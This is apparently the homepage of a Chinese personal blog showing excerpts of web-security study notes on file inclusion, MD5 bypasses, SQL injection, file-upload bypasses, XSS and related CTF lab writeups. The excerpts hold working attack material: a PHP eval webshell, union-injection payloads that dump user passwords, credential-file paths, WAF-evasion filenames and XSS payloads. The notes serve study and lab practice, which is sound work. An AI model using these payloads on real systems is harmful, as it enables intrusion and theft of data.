<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Mars1y</title><meta name="author" content="Mars1y"><meta name="copyright" content="Mars1y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
<meta property="og:title" content="Mars1y">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Mars1y">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/avatar.jpg">
<meta property="article:author" content="Mars1y">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Mars1y',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-02-25 18:59:37'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mogai.css"><link rel="stylesheet" href="/css/font/iconfont.css"><link rel="stylesheet" href="/css/yituliu.css"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Mars1y" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon--home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-exe-article-primary"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-Link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-geren"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Mars1y"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon--home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-exe-article-primary"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-Link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-geren"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Mars1y</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/Mars1y" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:820338868@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含漏洞学习">文件包含漏洞学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></span></div><div class="content">文件包含概述​		文件包含分为两种：

本地文件包含（Local File Include，简称 LFI），包含服务端的文件。
远程文件包含（Remote File Include，简称RFI），包含指定 url 的文件。


远程文件包含时，PHP 配置中需要：

allow_url_fopen&#x3D;On(默认为On) ，规定是否允许从远程服务器或者网站检索数据。

allow_url_include&#x3D;On(PHP5.2.x之后默认为Off)， 规定是否允许 include&#x2F;require 远程文件。



相关函数include​		包含文件发生错误时，程序警告，但会继续执行。
include_once​		和 include 类似，但只包含一次。
require​		包含文件发生错误时，程序报错，并直接终止执行。
require_once​		和 require 类似，但只包含一次。

上述四个函数，无论包含的是什么类型的文件，都将做为 PHP 代码执行。

敏感信息路径Windows123C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件C:\ProgramFiles\MySQL\my.ini //MySQL配置文件C:\ProgramFiles\MySQL\Data\mysql\user.MYD //MySQL root密码

Linux&#x2F;Unix12345678910111213141516/etc/passwd //账号密码/etc/shadow //账号密码/usr/local/app/apache2/conf/httpd.conf //Apache2配置文件/var/log/apache2/access.log //Apache日志文件/var/log/apache2/error.log //Apache错误日志/var/log/nginx/access.log //nginx日志文件/var/log/nginx/error.log //nginx错误日志/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置文件/usr/local/app/php5/lib/php.ini //PHP配置文件/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf //MySQL配置文件文件/etc/ssh/sshd_config //ssh配置文件/var/log/auth.log //ssh日志文件/etc/nginx/nginx.conf //nginx配置文件/etc/nginx/sites-enabled/default //nginx配置文件/var/www/html/ //默认网站路径

session文件包含获取session文件存储位置
查看 phpinfo：


默认位置：Linux 下默认存储在 &#x2F;var&#x2F;lib&#x2F;php&#x2F;session 目录下。


漏洞分析​		前置知识：session 的文件名为 sess_ + sessionid，sessionid 可 F12 查看：

​		测试代码：test.php
12345&lt;?phpsession_start();$cmd = $_GET[&#x27;cmd&#x27;];$_SESSION[&#x27;username&#x27;] = $cmd;?&gt;

​		访问 localhost/test.php?cmd=flag ，查看 session 文件：

​		如果写入 localhost/test.php?cmd=&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt; ，那么通过文件包含对应的 session 文件便可 getshell 。
日志文件包含web中间件访问日志包含Apache（选择性开启一个）

通用访问日志：对应 http.conf 中 ##CustomLog &quot;logs/access.log&quot; common


组合访问日志：对应 http.conf 中 #CustomLog &quot;logs/access.log&quot; combined



Nginx

​		已知日志文件中会写入访问内容和 User-Agent ，所以我们可以 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/25/MD5%E7%BB%95%E8%BF%87%E4%B8%8ESHA-1%E7%BB%95%E8%BF%87/" title="MD5绕过与SHA-1绕过">MD5绕过与SHA-1绕过</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></span></div><div class="content">0e绕过​		SHA-1 也适用。
​		当字符串为 ^[0-9]+e[0-9]+ 模式时，PHP 将试图把字符串转换为用科学计数法表示的数。如果不是真正的科学计数法表示的数，即 e 后面不全是数字，转换将出错，此时 PHP 将把它视为一个字符串。
​		所以，如果两字符串的 MD5 值都是 ^0e[0-9]+ 模式，即 e 后全部是数字，则可绕过 MD5 弱相等。
​		以下字符串的 MD5 值均为 ^0e[0-9]+ 的模式，即可转为数字 0 ：

QNKCDZO
QLTHNDT
PJNPDWY
NWWKITQ
NOOPCJF
MMHUWUV
MAUXXQC
240610708
s878926199a
s155964671a
s214587387a

​		以下字符串的 SHA-1 值均为 ^0e[0-9]+ 的模式，即可转为数字 0 ：

10932435112
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
0e1290633704

​		对于双重 md5() ，以下字符串进行两次 md5() 后以 0e 开头：

7r4lGXCH2Ksu2JNT3BYM
CbDLytmyGm2xQyaLNhWn
770hQgrBOjrcqftrlaZk

​		对于 $a==md5($a) ：

0e215962017

​		绕过 SQL 中的 md5() ，参考[BJDCTF 2020]easy_md5 ：

ffifdyop ，经过 md5() 函数后结果为 &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c
129581926211651571912466741651878684928 ，经过 md5() 函数后结果为 \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8

数组绕过​		PHP md5() 函数不能处理数组类型的量，将返回 NULL 。使用数组可以绕过 MD5 弱相等和强相等。
​		sha1() 也不能处理数组类型的量，所以使用数组也可以绕过 SHA-1 弱相等和强相等。
123456789101112131415$a[]=1;$b[]=2;var_dump($a);echo md5($a)==md5($b); //NULL==NULLecho md5($a)===md5($b); //NULL===NULL/*输出：array(1) &#123;  [0]=&gt;  int(1)&#125;11*/

NaN和INF绕过​		NAN 和 INF ，分别为非数字和无穷大，但 var_dump() 显示的数据类型都是 double 。
​		NAN 和 INF 拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为 false ，甚至  NAN===NAN 也是false 。但 md5() 函数处理它们的时候，是将其直接转换为字符串 NAN 和 INF 使用的，故 md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;) 为 true 。
MD5碰撞​		几组 payload：
123456789#1a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   #2a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></span></div><div class="content">vim泄露​		vim &lt;filename&gt; 命令，用 vim 打开文件。
​		用 vim 编辑文件时，如果正在编辑中的文件意外退出了，将会自动创建一个备份文件。如果文件名是 test.txt ，那么备份文件就是 .test.txt.swp ，并且备份文件不会展示出来。如果管理员没有删除这个备份文件，那么这个备份文件可能会被下载下来利用。
​		使用 vim -r .test.txt.swf 命令打开备份文件。
​		例题，[LitCTF 2023]Vim yyds 。
​		不开工具进行信息搜集，啥也没有。
​		下载页面 HTML 文档和图片文件，均用 vim 打开也没有什么。
​		开启目录扫描，发现主页面文件为 index.php ，尝试访问 /.index.php.swf ，浏览器自动下载了该文件，说明存在 vim 泄露。
​		vim 打开 .index.php.swf ，审计代码。
​		payload：password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag 。
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/25/%E6%95%A3%E5%88%97%E7%A2%B0%E6%92%9E/" title="散列碰撞">散列碰撞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></span></div><div class="content">MD5和SHA-1​		MD5（Message Digest Algorithm 5）是一种散列函数，用于计算消息的128位（16字节）散列值。
​		SHA-1（Secure Hash Algorithm 1）也是一种散列函数，用于计算消息的160位（20字节）散列值。
​		SHA-1 相对于 MD5 来说更安全。虽然 MD5 和 SHA-1 都容易受到碰撞攻击，但 SHA-1 比 MD5 更安全，因为它具有更大的散列值（160位比128位），提供了更高的抗碰撞能力。
​		由于安全性的问题，MD5 和 SHA-1 已经不推荐用于与安全性相关的应用，如密码存储和数字签名。对于需要更高安全性的应用，如密码哈希、数字证书、数据完整性验证等，应该使用更安全的散列算法，如 SHA-256、SHA-384 或 SHA-512。
​		尽管 MD5 和 SHA-1 在安全性方面存在问题，但它们仍然在某些非安全性相关的应用中有用。例如，用于简单的数据完整性检验或生成简短的哈希值，而不涉及密码或敏感数据的安全性。
散列碰撞​		散列碰撞是指找到两个不同的输入消息，但它们具有相同的散列值。
​		MD5 在理论上可以通过穷举法找到碰撞，但需要极大的计算能力和时间。然而，随着计算技术的发展，攻击者已经能够通过使用分布式计算和专用硬件等方法，实现更快速地生成 MD5 碰撞。
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/25/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入学习">SQL注入学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></span></div><div class="content">概述前置知识–+​		MySQL 中有三种注释符：# 、--空格 、/**/ 。 
​		url 中 # 会被浏览器解释为指导其动作的那个 # 号，所以如果需要使用 # ，需先将其 url 编码为 %23 。
​		对于 --空格 ，在 url 传入 --+ 时，+ 号到后端后会变为空格。
123&lt;?phpecho $_GET[&#x27;cmd&#x27;];?&gt;

​		传入 ?cmd=--+123 ：

select 1, database()

引号、括号问题​		它可能查不到结果，但它不会报错：


​		无论加几个半括号都可以：

一些函数
system_user()：MySQL 用户名
user()：用户名
current_user：当前用户名
session_user()：连接数据库的用户名
database()：数据库名
version()、@@version：MySQL 版本
@@datadir：数据库路径
@@basedir：MySQL安装路径
@@version_compile_os：操作系统

一些语句
show databases：查看所有库名
show tables：查看当前库下所有表名
show columns from xxx：查看 xxx 表的所有字段名，如果表名是数字，需要用反引号包围

information_schema库三表
information_schema.schemata：存储 MySQL 中的所有数据库的库名
information_schema.tables：存储 MySQL 中的所有数据表的表名
information_schema.columns：存储 MySQL 中的所有列的列名


MySQL5.0 以下，没有 information_schema 数据库。
MySQL5.0 以上，默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。

检测注入点​		id=1&#39; 、id=1&quot; 、id=1&#39;) 、 id=1&#39;))  、id=1&quot;)  、id=1&quot;)) 等。
闭合推理​		示例，sqli-labs Less-7 ：

1’：错
1” ：成
推出 ‘$id’
1’–+ ：错
推翻 ‘$id’
1’)–+：错
1’)) –+：成
推出 ((‘$id’))

注入类型联合注入爆语句​		注入点检测。
爆字段数​		?id=1&#39; order by N--+
爆回显位置​		?id=-1&#39; union select 1,2,3--+
爆库名​		?id=-1&#39; union select 1,2,database()--+
爆表名​		?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;xxx&#39;--+
爆列名
精确到表：?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39;--+
精确到库：?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;xxx&#39;--+

爆值​		?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+
报错注入extractvalue()123EXTRACTVALUE(xml_document, xpath_string)- xml_document：XML 文档名- xpath_string：目标 XML 标签在标签树的路径，如 `/book/author` 。

​		从目标 XML 文档中根据 xpath 匹配标 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/08/upload-labs/" title="upload-labs小记">upload-labs小记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-07T16:00:00.000Z" title="发表于 2024-02-08 00:00:00">2024-02-08</time></span></div><div class="content">前面的话​		本篇 writeup 只针对部分关卡。
​		查看Apache版本（这只是其中的一个方法）：
​		本地 upload-labs 使用的是 phpStudy 搭建的，但 phpStudy 操作面板里没有显示 Apache 版本。
​		在 phpStudy 安装目录里找到 Apache&#x2F;bin&#x2F; 目录，在此打开 cmd 窗口，输入 httpd -v 即可，本地显示为 2.4.43 。
Pass-01 客户端验证​		以下方法均可：

禁用 JS 。
删除表单处的 onsubmit 。
本地先改为合法扩展名，抓包再改回去。

Pass-02 MIME类型验证​		抓包，修改 MIME 类型。建议改为 image&#x2F;gif ，方便打组合拳。
Pass-03 Apache解析漏洞​		环境模拟：打开配置文件 httpd.conf，Ctrl+F 找到 AddType application/x-httpd-php 处，把 # 去掉，保存、重启。
​		抓包，把扩展名改为 .phtml 即可。
​		此配置信息是告诉 Apache 服务器，把扩展名是这几个的文件当 php 文件来解析，所以往里加 .abc 也一样当 php 来解析。其本身配置信息里只有 .php 和 .phtml，其他的如 .php1、.php3、.pht 什么的，除 ctf 外，实际情况下一般不会冒着风险往里加这些。
Pass-04 .htaccess​		.htaccess 是一个配置文件，运行于 Apache 上，需要把 httpd.conf 里 AllowOverride 处全改为 All 才允许 Apache 启用 .htaccess 文件。此时，当 .htaccess 文件被放置在一个通过 Apache 加载的目录中时，.htaccess 文件会被 Apache 检测并执行，.htaccess 文件将覆盖  Apache 的原配置文件 httpd.conf 。注意，.htaccess 文件仅作用于所在目录及其子目录。
​		环境模拟：更改 httpd.conf 相关设置，保存、重启。
​		创建一个 .htaccess 文件，写入：
1SetHandler application/x-httpd-php

​		即让  Apache 把所有文件都当成 php 来解析，如果仅指定特定文件名当作 php 来解析，则写为：
123&lt;FilesMatch &quot;文件名&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;

​		下一步，先上传 .htaccess 文件，再上传图片马，然后访问图片马即可。
Pass-05 .user.ini​		.ini 文件是 Windows 系统的配置文件，.user.ini 将覆盖 php 配置文件 php.ini，但 .user.ini 只能被 CGI&#x2F;FastCGI 处理。
​		除了 php.ini 外，PHP 还会从被执行的 php&#x2F; 目录开始一直上升到 web 根目录扫描 .ini 文件。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。注意，同 .htaccess，.user.ini 只能用于访问其所在目录及子目录下的文件时进行覆盖。
​		在 php.ini 文件中相关内容如下：
1234567891011;;;;;;;;;;;;;;;;;;;;; php.ini Options  ;;;;;;;;;;;;;;;;;;;;;; Name for user-defined php.ini (.htaccess) files. Default is &quot;.user.ini&quot;;user_ini.filename = &quot;.user.ini&quot;; To disable this feature set this option to empty value;user_ini.filename =; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes);user_ini.cache_ttl = 300

​		user_ini.filename 设定 PHP 在搜寻时的目标文件名，默认是 .us ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/02/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传漏洞学习">文件上传漏洞学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-02-07T16:00:00.000Z" title="发表于 2024-02-08 00:00:00">2024-02-08</time></span></div><div class="content">建议结合 upload-labs 笔记一起看
常见突破方式客户端验证
禁用 js 。
删除、更改 js 或 js 的触发条件。

MIME类型检测​		抓包，改 Content-Type 。建议改为 image&#x2F;gif，方便打组合拳。
服务端扩展名黑名单
抓住 Windows 的特点：

对大小写不敏感
自动去除扩展名末尾的空格、点、::$DATA

限制：php-版本号-nts+Apache 无法解析。

抓住 PHP 的特点：

&lt;5.3.4 版本存在 00 截断漏洞
user.ini 可覆盖 php.ini
move_upload_file 函数会忽略扩展名末尾的 /.


抓住 Apache 的特点：

.phtml、.php2、.php3、.php5、.pht 等可做为 .php 解析，但需要配置文件进行针对性修改
.htaccess 文件可覆盖 Apache 配置文件 httpd.conf，也需要配置文件进行针对性修改


分号截断。修改为如 filename=&quot;1.jpg;.php&quot; ，有一些 waf 遇 ; 会识别为请求字段的结束，从而忽略 ; 后面的内容。

换行。修改为如：
123filename=&quot;1.php&quot;

换行符会在后端程序中自动转换为 \n ，则 filename 的值为 1.p\nh\np ，从而绕过 waf 。
在 Windows 中，这里的换行符会自动去掉，最终文件名还是 1.php 。


文件内容检测
PHP 一句话木马：&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;


图片马绕过。制作：执行命令 copy/b 图片名+文件名 图片马名 。

文件幻术绕过。制作：在 &lt;?php ?&gt; 前添加文件幻术 ，并将 .php 改为对应扩展名。  
GIF 文件幻术：47 49 46 38 39 61 (GIF89a)

注意：

只检测文件头（前2个字节）：文件幻术、图片马均可突破
使用 getimagesize 函数：需图片马
使用 exif_imagetype 函数：需图片马




代码逻辑漏洞
条件竞争
二次渲染
其他

数据溢出​		请求包中加入大量垃圾数据（数字、字母等字符组合）来干扰 waf 的检测，从而绕过 waf 。

Content-Disposition 与 name 之间加入垃圾数据。
name 与 filename 之间加入垃圾数据。

​		注意，垃圾数据后面要加上分号，防止吞噬垃圾数据后面的请求字段。

符号变异​		如果 waf 会对请求包中的 filename 值进行检测，那么可以：
1234567891011121314filename=&quot;1.phpContent-Type: image/jpegfilename=&#x27;1.phpContent-Type: image/jpegfilename=1.phpContent-Type: image/jpegfilename=&quot;&quot;1.phpContent-Type: image/jpegfilename=&quot;1&quot;.phpContent-Type: image/jpeg

​		根据开发的思路，获取 filename 的值大概率是匹配引号内的值。现在将引号不闭合或者塞入非黑名单的值，那么 filename 的值将被干扰，从而绕过 waf 。
解析漏洞概述​		文件解析漏洞，是指 web 容器在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞，攻击者可以利用该漏洞实现非法文件的解析。
Apache​		Apache 在解析扩展名时是从右向左进行，如果遇到不能识别的扩展名则跳过，像 .rar、.gif 是 Apache 不能识别的。假如上传文件 xxx.php.bb.rar，.rar 不认识，向前解析，.bb 也不认识，向前解析，直到 .php 。
​		影响版本：

Apache 2.0.x &lt;&#x3D; 2.0.59
Apache 2.2.x &lt;&#x3D; 2.2.17
Apache 2.2.2 &lt;&#x3D; 2.2.8

CVE-2017-15715​		上传一个后缀末尾包含换行符的文件（\x0A），可以绕过 Apache 的 FilesMatch 设置，即 xxx.php\x0A 可被解析为 xxx.php 。影响版本 Ap ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/24/XSS/" title="XSS漏洞学习">XSS漏洞学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-23T16:00:00.000Z" title="发表于 2024-01-24 00:00:00">2024-01-24</time></span></div><div class="content">简介演示​		反射型 XSS ：
​		xss.html
123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;body&gt;        &lt;p&gt;Tell me who you are, and I will welcome you!&lt;/p&gt;        &lt;form action=&quot;./test.php&quot; method=&quot;GET&quot;&gt;            Your name: &lt;input type=&quot;text&quot; name=&quot;user&quot;/&gt;            &lt;button type=&quot;submit&quot;&gt;send&lt;/button&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;

​		test.php
1234&lt;?php    $user = $_GET[&#x27;user&#x27;];    echo &quot;&lt;p&gt;Hello, $user&lt;/p&gt;&quot;;?&gt;

​		原本这只是一个简单的欢迎：


​		但如果输入的是恶意代码，如 &lt;script&gt;alert(&quot;Hacker!&quot;);&lt;/script&gt; ，那就成 XSS 了：

漏洞成因​		网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的数据中存在可被浏览器执行的代码。
分类反射型​		又称非持久型 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。例如当用户提交一个表单时，跨站代码随同请求包发送到服务端，然后服务端反射回来，之后被浏览器解析跨站代码触发 XSS 漏洞。
​		这类跨站的代码通常不存储在服务端。受 XSS Auditor（Chrome内置的XSS保护）、NoScript 等防御手段的影响，反射型 XSS 的危害相对较小。
存储型​		又称持久型 XSS ，比反射型 XSS 更具有威胁性，攻击脚本被永久存放在服务器的数据库或文件中。
​		攻击方式：攻击者在发帖或留言等过程中，将恶意脚本连同正常信息一起写入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中执行。
DOM型​		基于 JS 的一种 XSS ，不需要与服务器进行交互，其通过修改页面 DOM 节点数据信息而形成 XSS 攻击。
​		攻击方式：用户请求一个由攻击者提供的 URL ，其中包含恶意代码，当用户的浏览器处理这个响应时，原始页面的 DOM 将会被修改，从而触发 XSS 漏洞。
通用型​		也叫做 UXSS ，是一种利用浏览器或者浏览器扩展程序的漏洞来制造产生 XSS 的一种攻击类型。
利用&lt;script&gt;
&lt;script src=&quot;http://xxx/xss.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;xss code&lt;/script&gt;

&lt;img&gt;
&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;/&gt;
&lt;img src=&quot;1&quot; onerror=&quot;eval(alert(&#39;xss&#39;))&quot;/&gt;
&lt;img src=&quot;1&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;/&gt;
&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt; ，IE7 以下。
&lt;img src=&quot;&quot; style=&quot;xss:expression(alert(&#39;xss&#39;))&quot;/&gt;  ，IE7 以下。

&lt;a&gt;
&lt;a href=&quot;javascript:alert(&#39;xss&#39;) ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/12/18/PHPunserialize/" title="PHP反序列化漏洞学习">PHP反序列化漏洞学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-17T16:00:00.000Z" title="发表于 2023-12-18 00:00:00">2023-12-18</time></span></div><div class="content">函数序列&#x2F;反序列化函数serialize()​		序列化对象或数组，并返回一个字符串。
